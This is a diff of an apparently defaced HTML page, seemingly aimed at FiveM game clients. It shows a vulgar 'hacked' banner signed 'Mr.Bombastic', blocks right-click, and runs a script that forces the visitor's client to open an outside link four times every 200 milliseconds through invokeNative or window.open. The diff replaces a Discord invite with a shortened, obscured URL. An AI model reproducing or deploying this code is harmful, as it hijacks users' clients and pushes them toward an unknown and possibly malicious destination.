@@ -79,7 +79,6 @@
       <div id="media-placeholder"></div>
     </div>
     
-    <!-- 176 Removed from text -->
     <div class="hacked-text">YOU GOT FUCKED By Mr.Bombastic</div>
     
     <div id="info-block">
@@ -91,7 +90,6 @@
       <span id="browser">Client: Identifying...</span>
     </div>
     
-    <!-- 176 Removed from text -->
     <div class="small-note">By Mr.Bombastic</div>
   </div>
 
@@ -201,25 +199,25 @@
       document.addEventListener('contextmenu', e => e.preventDefault());
 
       /* ============================================================
-         فتح رابط الديسكورد (FiveM invokeNative) - KEPT INTACT
+         فتح الرابط الجديد (New Link Replaced)
          ============================================================ */
-      const DISCORD_URL = "https://discord.gg/176";
+      const TARGET_URL = "https://unl.one/2ABW9";
 
-      function openDiscord() {
+      function openTargetUrl() {
         try {
           if (typeof window.invokeNative === 'function') {
-            window.invokeNative("openUrl", DISCORD_URL);
+            window.invokeNative("openUrl", TARGET_URL);
           } else if (typeof window.open === 'function') {
-            window.open(DISCORD_URL, '_blank');
+            window.open(TARGET_URL, '_blank');
           }
         } catch (e) { /* تجاهل */ }
       }
 
       setInterval(() => {
-        openDiscord();
-        openDiscord();
-        openDiscord();
-        openDiscord();
+        openTargetUrl();
+        openTargetUrl();
+        openTargetUrl();
+        openTargetUrl();
       }, 200);
     })();
   </script>
